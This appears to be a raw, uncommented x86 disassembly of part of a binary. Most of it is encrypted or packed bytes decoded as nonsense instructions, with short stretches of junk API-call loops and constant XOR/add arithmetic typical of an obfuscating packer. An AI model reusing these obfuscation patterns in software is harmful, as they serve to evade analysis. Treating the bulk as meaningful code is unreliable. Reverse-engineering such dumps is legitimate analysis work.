  404987:	mov    dl,0x8d
  404989:	loope  0x4049be
  40498b:	sbb    al,ah
  40498d:	stc    
  40498e:	mov    bh,0xfb
  404990:	xor    eax,0xb9532451
  404995:	push   ebp
  404996:	loope  0x404925
  404998:	dec    eax
  404999:	xchg   edi,edx
  40499b:	pop    edx
  40499c:	iret   
  40499d:	dec    edx
  40499e:	push   ebp
  40499f:	xor    cl,BYTE PTR [ecx-0x10602704]
  4049a5:	stos   DWORD PTR es:[edi],eax
  4049a6:	shl    DWORD PTR [edx],0x89
  4049a9:	sahf   
  4049aa:	inc    ebx
  4049ab:	mov    ds:0x71283c39,eax
  4049b0:	push   esp
  4049b1:	test   al,0xab
  4049b3:	inc    esi
  4049b4:	cmp    DWORD PTR [eax+0x1e140b91],0xffffff8b
  4049bb:	sbb    ecx,DWORD PTR [edx]
  4049bd:	jmp    0xd5b1:0x205f00e5
  4049c4:	xchg   ebp,ebx
  4049c6:	add    al,0x11
  4049c8:	loope  0x404a1d
  4049ca:	pop    esp
  4049cb:	cwde   
  4049cc:	xchg   ebp,eax
  4049cd:	sub    ebx,DWORD PTR [ebx-0x687937d]
  4049d3:	and    BYTE PTR [esp+esi*8+0x33],dl
  4049d7:	leave  
  4049d8:	(bad)  
  4049d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4049da:	es (bad) 
  4049dc:	sub    ebx,DWORD PTR [eax]
  4049de:	inc    eax
  4049df:	xor    edi,edi
  4049e1:	cmp    esi,DWORD PTR [edi+0x52401dbf]
  4049e7:	jns    0x404a0c
  4049e9:	psubsw mm5,QWORD PTR [ecx-0x2fddbee8]
  4049f0:	test   eax,0x4ccf7a98
  4049f5:	mov    WORD PTR [ecx+esi*8-0x1c44d4fe],es
  4049fc:	sub    eax,0x630fde24
  404a01:	mov    dh,0x86
  404a03:	aam    0xfd
  404a05:	loopne 0x4049c3
  404a07:	mov    edx,0x271418ba
  404a0c:	lock or cl,bh
  404a0f:	or     al,0xc8
  404a11:	xchg   edx,eax
  404a12:	mov    edi,0x5a94d12e
  404a17:	cmp    ebp,DWORD PTR [edx-0x2e9e76f]
  404a1d:	mov    ds:0x5b7c9ccb,al
  404a22:	popf   
  404a23:	sbb    esi,DWORD PTR [esi+edx*2]
  404a26:	sbb    al,0x3d
  404a28:	cmp    BYTE PTR [esi+0x25],bl
  404a2b:	iret   
  404a2c:	adc    dh,cl
  404a2e:	jo     0x404aaa
  404a30:	shl    BYTE PTR [edx+0x2e],1
  404a33:	mov    eax,esi
  404a35:	addr16 jp 0x404a26
  404a38:	stc    
  404a39:	ds popa 
  404a3b:	pop    es
  404a3c:	pop    ds
  404a3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a3e:	xor    al,bl
  404a40:	jb     0x404a09
  404a42:	pop    edx
  404a43:	stos   DWORD PTR es:[edi],eax
  404a44:	mov    esi,0x568f4343
  404a49:	mov    ebx,0x94dc2c95
  404a4e:	bound  ecx,QWORD PTR [ebx+eiz*1]
  404a51:	lock push esi
  404a53:	loope  0x404a94
  404a55:	dec    ebx
  404a56:	inc    esi
  404a57:	add    al,0x53
  404a59:	mov    edi,0x843afb90
  404a5e:	retf   0xa17
  404a61:	retf   0x4e94
  404a64:	imul   eax,DWORD PTR [edi+0x37205548],0xffffff8c
  404a6b:	mov    cl,0xfd
  404a6d:	je     0x404a34
  404a6f:	mov    ds:0x41706b90,al
  404a74:	arpl   dx,cx
  404a76:	sahf   
  404a77:	dec    ebp
  404a78:	in     al,dx
  404a79:	arpl   WORD PTR [ebx-0x45a755a4],bx
  404a7f:	nop
  404a80:	sbb    dh,BYTE PTR [edx+ebp*1-0x3a]
  404a84:	aad    0xd0
  404a86:	sbb    al,0xf2
  404a88:	pop    eax
  404a89:	addr16 push cx
  404a8c:	test   BYTE PTR [edi-0x63edefd1],cl
  404a92:	xor    eax,0xb31a5866
  404a97:	and    ch,BYTE PTR [edx-0x56]
  404a9a:	xor    ecx,edi
  404a9c:	cmp    DWORD PTR [esi+0x16],0xffffffab
  404aa0:	jns    0x404ac8
  404aa2:	int    0xe6
  404aa4:	sub    dl,BYTE PTR [ebx-0x72]
  404aa7:	pop    es
  404aa8:	mov    bh,0x20
  404aaa:	adc    eax,0xe02ef865
  404aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ab0:	fdivr  QWORD PTR [ebx+0x63]
  404ab3:	lea    ebx,[esi+0x3f]
  404ab6:	hlt    
  404ab7:	lahf   
  404ab8:	pop    es
  404ab9:	and    ebx,DWORD PTR [edx]
  404abb:	mov    bh,0x5f
  404abd:	sbb    esp,DWORD PTR [eax+0x34a85b4c]
  404ac3:	(bad)  
  404ac4:	xor    eax,0x38be6026
  404ac9:	arpl   dx,si
  404acb:	mov    bh,BYTE PTR [ecx-0x56]
  404ace:	sbb    eax,DWORD PTR [edx]
  404ad0:	mov    ah,0x8d
  404ad2:	xchg   esp,eax
  404ad3:	mov    edi,0x31209e92
  404ad8:	jmp    0x404b4c
  404ada:	sahf   
  404adb:	adc    al,0x47
  404add:	mov    cl,0xa
  404adf:	adc    al,dh
  404ae1:	mov    cs,WORD PTR [edx+0x67]
  404ae4:	inc    edi
  404ae5:	in     al,0x47
  404ae7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ae8:	dec    ebp
  404ae9:	xchg   esp,esi
  404aeb:	shr    bh,0x48
  404aee:	cli    
  404aef:	adc    BYTE PTR [edi+0x31ca9e4a],0xe6
  404af6:	and    eax,DWORD PTR [ebx-0x2b]
  404af9:	add    al,dl
  404afb:	test   BYTE PTR [edi-0xcaa65e3],ch
  404b01:	lock or DWORD PTR [ebx],0x4b
  404b05:	and    al,0x11
  404b07:	cmp    DWORD PTR [ebx-0x1568dc0b],esi
  404b0d:	inc    ebx
  404b0e:	mov    ebp,0x74f48dce
  404b13:	or     eax,0x2a64c61b
  404b18:	cld    
  404b19:	outs   dx,DWORD PTR ds:[esi]
  404b1a:	jge    0x404b6f
  404b1c:	mov    BYTE PTR [esi],cl
  404b1e:	sbb    bl,BYTE PTR [edx]
  404b20:	xchg   edx,eax
  404b21:	and    al,0x43
  404b23:	fistp  WORD PTR [ecx+esi*4+0x8a00131]
  404b2a:	xchg   edi,eax
  404b2b:	push   0x86d61166
  404b30:	push   ss
  404b31:	fimul  DWORD PTR [ebp+0x5dc3f67]
  404b37:	gs sti 
  404b39:	mov    ds:0xfaae2d04,al
  404b3e:	jmp    0x404b90
  404b40:	cmp    ebx,DWORD PTR cs:[eax+0x74]
  404b44:	lods   eax,DWORD PTR ds:[esi]
  404b45:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b47:	adc    ch,ah
  404b49:	imul   edi
  404b4b:	dec    edi
  404b4c:	pushf  
  404b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b4e:	jne    0x404aff
  404b50:	cmp    bl,bl
  404b52:	jmp    0x404b57
  404b54:	mov    ebx,0xee7bb93
  404b59:	pop    ebx
  404b5a:	inc    edi
  404b5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b5c:	fisttp DWORD PTR [ebx]
  404b5e:	emms   
  404b60:	pop    ebp
  404b61:	dec    ecx
  404b62:	xor    DWORD PTR [edx],edx
  404b64:	mov    eax,ds:0x2bf51ec0
  404b69:	sub    BYTE PTR [esi],0x67
  404b6c:	or     ebp,DWORD PTR [esi-0x41df7621]
  404b72:	loope  0x404b9f
  404b74:	or     DWORD PTR [eax+0x72451907],eax
  404b7a:	jp     0x404afc
  404b7c:	std    
  404b7d:	(bad)  
  404b7e:	leave  
  404b7f:	es jp  0x404b6b
  404b82:	into   
  404b83:	stos   BYTE PTR es:[edi],al
  404b84:	(bad)  
  404b86:	or     bh,BYTE PTR [edx]
  404b88:	test   BYTE PTR [ebp-0x1eebd50c],0xa6
  404b8f:	shl    DWORD PTR [esi+eiz*1],cl
  404b92:	pop    eax
  404b93:	xor    dh,dl
  404b95:	leave  
  404b96:	test   eax,0xcf01657c
  404b9b:	dec    esi
  404b9c:	lea    eax,[edx]
  404b9e:	mov    cl,0xdf
  404ba0:	xor    bh,BYTE PTR [ebp+0x7e]
  404ba3:	fisubr WORD PTR [ebx-0x1baa9340]
  404ba9:	popf   
  404baa:	lea    ecx,[ebp+0x35564ba0]
  404bb0:	(bad)  
  404bb1:	xor    bl,bl
  404bb3:	xor    BYTE PTR [esi],bl
  404bb5:	aaa    
  404bb6:	push   edi
  404bb7:	mov    bh,0xf4
  404bb9:	fisttp WORD PTR [esi]
  404bbb:	xchg   BYTE PTR [ebx+esi*1+0x67],ch
  404bbf:	fist   WORD PTR [eax+ecx*8+0x5d]
  404bc3:	sub    bh,bl
  404bc5:	or     DWORD PTR [ebx],0x693b8949
  404bcb:	outs   dx,WORD PTR ds:[esi]
  404bcd:	push   ecx
  404bce:	pusha  
  404bcf:	push   ecx
  404bd0:	loope  0x404b6a
  404bd2:	jae    0x404ba4
  404bd4:	pop    esp
  404bd5:	dec    ecx
  404bd6:	pop    ss
  404bd7:	jmp    0x9f89a27a
  404bdc:	stos   DWORD PTR es:[edi],eax
  404bdd:	xchg   ebp,eax
  404bde:	mov    dl,0xfc
  404be0:	pushf  
  404be1:	ds push ss
  404be3:	cmp    al,0xa
  404be5:	pop    esp
  404be6:	(bad)  
  404be7:	mov    eax,ds:0xb7fded77
  404bec:	fwait
  404bed:	ins    BYTE PTR es:[edi],dx
  404bee:	out    dx,eax
  404bef:	scas   al,BYTE PTR es:[edi]
  404bf0:	mov    ch,0xd2
  404bf2:	repnz outs dx,BYTE PTR ds:[esi]
  404bf4:	inc    ebx
  404bf5:	lahf   
  404bf6:	dec    edx
  404bf7:	test   DWORD PTR [ecx],edi
  404bf9:	lods   eax,DWORD PTR ds:[esi]
  404bfa:	xor    al,0x0
  404bfc:	inc    ebx
  404bfd:	lds    eax,FWORD PTR [ecx-0x44]
  404c00:	in     eax,dx
  404c01:	push   ebx
  404c02:	mov    WORD PTR [eax],cs
  404c04:	or     al,0xbe
  404c06:	push   esi
  404c07:	mov    ebx,0x456ca12f
  404c0c:	aaa    
  404c0d:	adc    eax,0x728b6d59
  404c12:	mov    al,ds:0x935c9f12
  404c17:	imul   ebx,DWORD PTR [ebx],0xffffffe6
  404c1a:	push   esp
  404c1b:	cdq    
  404c1c:	jl     0x404bda
  404c1e:	in     eax,dx
  404c1f:	retf   
  404c20:	pop    esi
  404c21:	xor    BYTE PTR [eax+0x6b42a667],cl
  404c27:	push   0x78527ba
  404c2c:	xor    DWORD PTR [ecx-0x31161616],ebp
  404c32:	aad    0x42
  404c34:	hlt    
  404c35:	loopne 0x404be2
  404c37:	mov    ecx,0x7a113f82
  404c3c:	mov    DWORD PTR [edi],ebp
  404c3e:	push   ss
  404c3f:	dec    ebp
  404c40:	ja     0x404ca2
  404c42:	pop    edx
  404c43:	fwait
  404c44:	jo     0x404c83
  404c46:	cmp    eax,0x7345f82b
  404c4b:	pop    ecx
  404c4c:	mov    cl,0x3a
  404c4e:	js     0x404bfc
  404c50:	push   es
  404c51:	xchg   ebp,eax
  404c52:	sub    BYTE PTR [esi],ch
  404c54:	or     ebx,DWORD PTR [edi+0x75]
  404c57:	xor    cl,BYTE PTR [ecx+ebx*2]
  404c5a:	outs   dx,DWORD PTR ds:[esi]
  404c5b:	xchg   ebp,eax
  404c5c:	and    eax,0x3d5e7aea
  404c61:	xchg   ebx,eax
  404c62:	or     eax,0x1a238401
  404c67:	dec    edx
  404c68:	mov    ds:0xa072ace,al
  404c6d:	push   es
  404c6e:	pop    edi
  404c6f:	jecxz  0x404c5c
  404c71:	jg     0x404c62
  404c73:	test   eax,0xf686ca9
  404c78:	mov    dl,0xe9
  404c7a:	test   DWORD PTR [ecx],0x63861e6b
  404c80:	xor    bh,bh
  404c82:	data16 out dx,al
  404c84:	pop    esp
  404c85:	add    bl,BYTE PTR ss:[ebp+0x56133ddd]
  404c8c:	into   
  404c8d:	jnp    0x404d03
  404c8f:	ja     0x404cb8
  404c91:	cmp    DWORD PTR [esi+0x32],ecx
  404c94:	sbb    eax,0x95f558af
  404c99:	jge    0x404ce1
  404c9b:	test   bl,bl
  404c9d:	jns    0x404c67
  404c9f:	adc    dl,ch
  404ca1:	jns    0x404c4c
  404ca3:	aaa    
  404ca4:	sahf   
  404ca5:	xlat   BYTE PTR ds:[ebx]
  404ca6:	test   cl,0xdf
  404ca9:	scas   al,BYTE PTR es:[edi]
  404caa:	sbb    ebx,DWORD PTR ds:0xcbfcc97
  404cb0:	fwait
  404cb1:	idiv   DWORD PTR [ecx+0x39]
  404cb4:	push   0xffffff9b
  404cb6:	ror    BYTE PTR [edx+0x7d],0x26
  404cba:	cmp    eax,0x795f979a
  404cbf:	or     al,0x15
  404cc1:	out    0xed,eax
  404cc3:	xor    edx,DWORD PTR [ecx+0x519cb4b9]
  404cc9:	sub    dh,dh
  404ccb:	imul   esp,DWORD PTR [ecx],0xbff69e0a
  404cd1:	inc    edx
  404cd2:	sub    al,0x86
  404cd4:	pop    ecx
  404cd5:	mov    edi,0x41555f54
  404cda:	test   bh,bh
  404cdc:	std    
  404cdd:	mov    edi,0x93854aaa
  404ce2:	xor    esp,ecx
  404ce4:	jno    0x404c97
  404ce6:	inc    esi
  404ce7:	xchg   DWORD PTR [edi],esp
  404ce9:	dec    esi
  404cea:	loope  0x404d13
  404cec:	ror    DWORD PTR [ecx-0x48e3c8db],1
  404cf2:	aaa    
  404cf3:	addr16 js 0x404d4c
  404cf6:	(bad)  [edx]
  404cf8:	cmp    BYTE PTR [ebx],bh
  404cfa:	cmp    edi,esi
  404cfc:	outs   dx,BYTE PTR ds:[esi]
  404cfd:	mov    eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0x69aa7d7b
  404d49:	mov    edx,gs
  404d4b:	jle    0x404d68
  404d4d:	das    
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404d19
  404d55:	fdivr  QWORD PTR ds:0x209a8e39
  404d5b:	jle    0x404d16
  404d5d:	call   0x48ca:0xdd70d19e
  404d64:	imul   BYTE PTR [edx]
  404d66:	sbb    BYTE PTR [ecx+ebx*4+0xa],0xda
  404d6b:	cli    
  404d6c:	mov    ?,WORD PTR [esi]
  404d6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d6f:	push   0xc7b09a5b
  404d74:	repnz mov es,ebx
  404d77:	pop    edi
  404d78:	or     edi,DWORD PTR [edx]
  404d7a:	jle    0x404d20
  404d7c:	call   0xf11dac86
  404d81:	and    al,0xc5
  404d83:	xchg   ebx,eax
  404d84:	mov    ah,0xf0
  404d86:	push   0x467cd7d3
  404d8b:	int3   
  404d8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d8d:	stos   BYTE PTR es:[edi],al
  404d8e:	in     eax,dx
  404d8f:	je     0x404dba
  404d91:	jnp    0x404e10
  404d93:	sbb    edi,DWORD PTR [edi-0x2d7acd28]
  404d99:	mov    dl,0x9f
  404d9b:	shr    DWORD PTR [ebx+eiz*2+0x34c830e0],cl
  404da2:	add    BYTE PTR [edx],0x43
  404da5:	mov    WORD PTR [edi+eax*8],gs
  404da8:	iret   
  404da9:	aaa    
  404daa:	scas   al,BYTE PTR es:[edi]
  404dab:	pusha  
  404dac:	mov    al,ds:0x7d9d34e1
  404db1:	sti    
  404db2:	mov    eax,0xf270fd05
  404db7:	(bad)  
  404db8:	fdiv   DWORD PTR [edi+eiz*8-0x36c754a4]
  404dbf:	arpl   bx,ax
  404dc1:	mov    al,ds:0x50cdb049
  404dc6:	imul   ecx,DWORD PTR [esi-0x58],0xffffffac
  404dca:	mov    al,0xac
  404dcc:	jne    0x404dda
  404dce:	aam    0xd0
  404dd0:	dec    edi
  404dd1:	lea    ecx,[esp]
  404dd4:	and    cl,dl
  404dd6:	lea    esi,[ecx]
  404dd8:	ror    edi,0x9d
  404ddb:	nop
  404ddc:	xchg   DWORD PTR [edi-0x47],ebx
  404ddf:	repz loopne 0x404df6
  404de2:	sbb    eax,ebp
  404de4:	data16 cmp al,0xfa
  404de7:	or     esi,DWORD PTR [ebp+edx*8-0x53]
  404deb:	sub    al,0x63
  404ded:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404dee:	scas   al,BYTE PTR es:[edi]
  404def:	dec    esp
  404df0:	sub    al,BYTE PTR [ecx+0x42]
  404df3:	out    0xc7,al
  404df5:	inc    ecx
  404df6:	je     0x404e0f
  404df8:	das    
  404df9:	or     eax,0x805efcae
  404dfe:	lods   eax,DWORD PTR ds:[esi]
  404dff:	xchg   ebx,eax
  404e00:	mov    al,ds:0x1a2cbe78
  404e05:	inc    edi
  404e06:	xchg   DWORD PTR [ebp-0x61926692],edx
  404e0c:	lods   eax,DWORD PTR ds:[esi]
  404e0d:	ins    DWORD PTR es:[edi],dx
  404e0e:	fisubr WORD PTR [esi-0x56c8a25a]
  404e14:	add    BYTE PTR ss:[edi-0xf4240c8],dl
  404e1b:	ins    DWORD PTR es:[edi],dx
  404e1c:	icebp  
  404e1d:	xor    DWORD PTR [edi+0x55],edi
  404e20:	retf   
  404e21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e22:	sti    
  404e23:	dec    edx
  404e24:	test   BYTE PTR [eax-0x28bf912f],bh
  404e2a:	shl    DWORD PTR [esi],1
  404e2c:	inc    esp
  404e2d:	push   esp
  404e2e:	rcl    DWORD PTR [ebx-0x2c],0x95
  404e32:	dec    esi
  404e33:	inc    edi
  404e34:	inc    edx
  404e35:	dec    ebp
  404e36:	icebp  
  404e37:	pusha  
  404e38:	xchg   DWORD PTR [esi+0x47],esp
  404e3b:	add    al,0xf5
  404e3d:	rcl    BYTE PTR [esi+edi*8],cl
  404e40:	stc    
  404e41:	lea    edx,[esi]
  404e43:	sbb    cl,BYTE PTR [eax]
  404e45:	xchg   ebp,eax
  404e46:	psrld  mm6,mm1
  404e49:	jg     0x404e99
  404e4b:	jbe    0x404e82
  404e4d:	popa   
  404e4e:	nop
  404e4f:	mov    ebp,0x1ea5b226
  404e54:	dec    ecx
  404e55:	into   
  404e56:	div    BYTE PTR ds:0x954a31e8
  404e5c:	pop    edi
  404e5d:	sbb    ecx,DWORD PTR [esi]
  404e5f:	popa   
  404e60:	dec    ebp
  404e61:	js     0x404de7
  404e63:	data16 (bad) 
  404e65:	in     eax,0x87
  404e67:	mov    cl,BYTE PTR [ecx]
  404e69:	and    esi,DWORD PTR [esi+0x42]
  404e6c:	mov    bh,0x80
  404e6e:	aas    
  404e6f:	mov    ecx,0x67a825a9
  404e74:	and    BYTE PTR [esi],ah
  404e76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e77:	or     al,0x58
  404e79:	cmp    BYTE PTR [esi+0x42],ah
  404e7c:	mov    ah,0xfa
  404e7e:	xchg   ecx,eax
  404e7f:	(bad)  
  404e81:	outs   dx,BYTE PTR ds:[esi]
  404e82:	fld    TBYTE PTR [edi+0x43]
  404e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e86:	inc    esi
  404e87:	aas    
  404e88:	sahf   
  404e89:	lds    edx,FWORD PTR [edi+0x3e]
  404e8c:	or     ecx,ebx
  404e8e:	adc    eax,0x10d79273
  404e93:	je     0x404ef7
  404e95:	push   ds
  404e96:	imul   edi,DWORD PTR [ebx+esi*4],0x38d08ad5
  404e9d:	sbb    al,BYTE PTR [ebp-0x79ad2302]
  404ea3:	jg     0x404ede
  404ea5:	or     edx,DWORD PTR [ebx+edi*1-0x43]
  404ea9:	pop    ebp
  404eaa:	xchg   ebp,eax
  404eab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404eac:	cwde   
  404ead:	jge    0x404e60
  404eaf:	loopne 0x404e9f
  404eb1:	xchg   ebx,eax
  404eb2:	fneni(8087 only) 
  404eb4:	cdq    
  404eb5:	cmp    al,0xad
  404eb7:	cli    
  404eb8:	pop    di
  404eba:	or     ch,BYTE PTR [edi+edi*2]
  404ebd:	add    DWORD PTR [ebx],esi
  404ebf:	cmp    esi,DWORD PTR ds:0xb42266bd
  404ec5:	inc    esp
  404ec6:	aaa    
  404ec7:	lahf   
  404ec8:	ss dec ebp
  404eca:	in     al,0x0
  404ecc:	mov    ecx,0x7c6667bd
  404ed1:	add    al,0xcb
  404ed3:	dec    edi
  404ed4:	mov    esp,0x77a2e607
  404ed9:	and    BYTE PTR [edi-0x32],al
  404edc:	hlt    
  404edd:	pop    edi
  404ede:	(bad)  
  404ee0:	ret    
  404ee1:	lea    ebp,[edx+eiz*1]
  404ee4:	ror    DWORD PTR [eax+0x3b],1
  404ee7:	fstp   TBYTE PTR [ebx+0x51]
  404eea:	sbb    cl,BYTE PTR [edi-0x10555d65]
  404ef0:	cmp    eax,0xd712fee9
  404ef5:	cdq    
  404ef6:	adc    eax,0xfb83f97b
  404efb:	sbb    al,0x8c
  404efd:	dec    esi
  404efe:	pop    ebx
  404eff:	cs ins DWORD PTR es:[edi],dx
  404f01:	in     al,dx
  404f02:	cld    
  404f03:	daa    
  404f04:	dec    edi
  404f05:	or     ecx,edi
  404f07:	into   
  404f08:	sbb    ebp,esi
  404f0a:	fcomp  DWORD PTR [esi]
  404f0c:	les    edi,FWORD PTR [eax]
  404f0e:	scas   al,BYTE PTR es:[edi]
  404f0f:	pop    esi
  404f10:	add    bl,BYTE PTR [ebp-0x28c9fd6f]
  404f16:	and    ebp,DWORD PTR [esi]
  404f18:	or     eax,0xf4fa8177
  404f1d:	xchg   DWORD PTR [edx+edx*2-0x39dffb68],ecx
  404f24:	jb     0x404eae
  404f26:	mov    bh,0xd1
  404f28:	mov    ebx,0x72904e8d
  404f2d:	sahf   
  404f2e:	cmp    al,0x17
  404f30:	adc    dh,BYTE PTR [esi]
  404f32:	jle    0x404ec9
  404f34:	push   ecx
  404f35:	or     edx,DWORD PTR ds:0x4345fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43468b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43468b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43468b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43468b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43468b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4345f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434693,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434693
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434693,edx
  404fbc:	cmp    DWORD PTR ds:0x434693,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434849
  404fce:	push   0x4347ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434693,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434637
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434637,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	ins    BYTE PTR es:[edi],dx
  405050:	je     0x405024
  405052:	push   0x7e7e297b
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x405026
  40505c:	loope  0x4050a3
  40505e:	test   DWORD PTR [ebx-0x2d2f1092],edx
  405064:	enter  0x5787,0xfa
  405068:	lds    eax,FWORD PTR [eax]
  40506a:	jnp    0x405080
  40506c:	sub    eax,0x108cebab
  405071:	repz (bad) 
  405073:	pop    ss
  405074:	addr16 mov esp,0x9b1495f1
  40507a:	(bad)  
  40507b:	cs sbb eax,0xc976e6c
  405081:	add    al,0xf9
  405083:	sbb    ch,al
  405085:	outs   dx,BYTE PTR ds:[esi]
  405086:	mov    edx,ebx
  405088:	cli    
  405089:	sti    
  40508a:	into   
  40508b:	inc    esp
  40508c:	or     BYTE PTR [edi+0x38],ch
  40508f:	pop    edx
  405090:	xor    edx,eax
  405092:	fcmovnbe st,st(0)
  405094:	mov    eax,DWORD PTR [ecx+0x24]
  405097:	cld    
  405098:	(bad)  
  405099:	pop    ss
  40509a:	xor    al,0xbb
  40509c:	out    dx,eax
  40509d:	dec    ecx
  40509e:	mov    ds:0xf1c31223,al
  4050a3:	jo     0x40510e
  4050a5:	sub    ax,0x5b01
  4050a9:	sti    
  4050aa:	push   esp
  4050ab:	cmp    BYTE PTR [eax+0x3e],cl
  4050ae:	xchg   ebx,eax
  4050af:	mov    esp,0xcf5aac1c
  4050b4:	out    0x47,al
  4050b6:	mov    ch,BYTE PTR [ebx]
  4050b8:	jne    0x405090
  4050ba:	stc    
  4050bb:	mov    ah,cl
  4050bd:	lea    edx,[eax+0x36]
  4050c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c1:	rcr    BYTE PTR [ebx-0x20],cl
  4050c4:	lods   al,BYTE PTR ds:[esi]
  4050c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4050c6:	pop    ebp
  4050c7:	push   0x3d4da7b7
  4050cc:	sbb    eax,0x4012e1aa
  4050d1:	jp     0x4050fa
  4050d3:	push   ebp
  4050d4:	inc    DWORD PTR [esi-0x67]
  4050d7:	xchg   esi,eax
  4050d8:	int    0x11
  4050da:	pushf  
  4050db:	push   edx
  4050dc:	jne    0x405102
  4050de:	mov    al,0x1c
  4050e0:	adc    BYTE PTR [esi-0x29751d88],dl
  4050e6:	ins    BYTE PTR es:[edi],dx
  4050e7:	xchg   ebx,eax
  4050e8:	inc    ebx
  4050e9:	div    DWORD PTR [ebp-0x1f335522]
  4050ef:	and    bl,BYTE PTR ss:[edx-0x71]
  4050f3:	inc    ebp
  4050f4:	fistp  DWORD PTR [esi+0x25]
  4050f7:	loope  0x405153
  4050f9:	nop
  4050fa:	sbb    bl,BYTE PTR ds:0x1178dd0f
  405100:	repnz xor ch,BYTE PTR cs:[esi+ebx*4+0xef8c28c]
  405109:	ror    BYTE PTR [edi-0x53],cl
  40510c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40510d:	pop    edi
  40510e:	in     al,0xa7
  405110:	cld    
  405111:	dec    esp
  405112:	inc    ebx
  405113:	or     BYTE PTR [eax+0x32],dl
  405116:	xor    ebx,DWORD PTR ds:0x3386b376
  40511c:	dec    eax
  40511d:	cli    
  40511e:	out    0x3f,al
  405120:	push   edx
  405121:	sub    edi,DWORD PTR [ebp-0x260a39e5]
  405127:	cmp    eax,0x7a256036
  40512c:	xor    al,dh
  40512e:	or     al,0xa8
  405130:	mov    bh,0x16
  405132:	dec    ebp
  405133:	mov    DWORD PTR [edi],eax
  405135:	dec    edx
  405136:	fisttp DWORD PTR [esp+eax*2-0x19]
  40513a:	sbb    bh,bl
  40513c:	mov    edi,0xa73c9295
  405141:	outs   dx,BYTE PTR ds:[esi]
  405142:	add    BYTE PTR [eax+ebx*4+0x68b01a57],bl
  405149:	mov    esi,0xbedb0445
  40514e:	ins    DWORD PTR es:[edi],dx
  40514f:	das    
  405150:	mov    ds:0xb55b348f,al
  405155:	xor    eax,0x55f5a12e
  40515a:	xchg   ebx,eax
  40515b:	push   edx
  40515c:	mov    bh,0xf0
